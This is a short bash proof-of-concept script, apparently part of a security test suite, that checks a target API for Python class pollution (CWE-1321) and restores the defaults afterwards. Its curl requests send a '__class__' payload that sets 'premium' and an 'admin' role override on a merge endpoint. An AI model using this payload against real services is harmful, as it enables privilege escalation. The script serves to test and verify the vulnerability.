#!/usr/bin/env bash
# CLASSPOLL-001 (CWE-1321): Python class pollution. A recursive attribute merge
# descends via getattr(dst, "__class__") and mutates CLASS-level state, so a
# later, clean request sees the polluted defaults. Self-cleaning.
set -eu; . "$(dirname "$0")/_lib.sh"
curl -s -X POST "$TARGET/api/flags/merge" -H 'content-type: application/json' \
  -d '{"__class__":{"premium":true,"role_override":"admin"}}' >/dev/null
got=$(curl -s "$TARGET/api/flags/state")
# restore class defaults so the mutation does not leak to other PoCs
curl -s -X POST "$TARGET/api/flags/merge" -H 'content-type: application/json' \
  -d '{"__class__":{"premium":false,"role_override":null}}' >/dev/null
echo "$got" | grep -q '"roleOverride":"admin"'
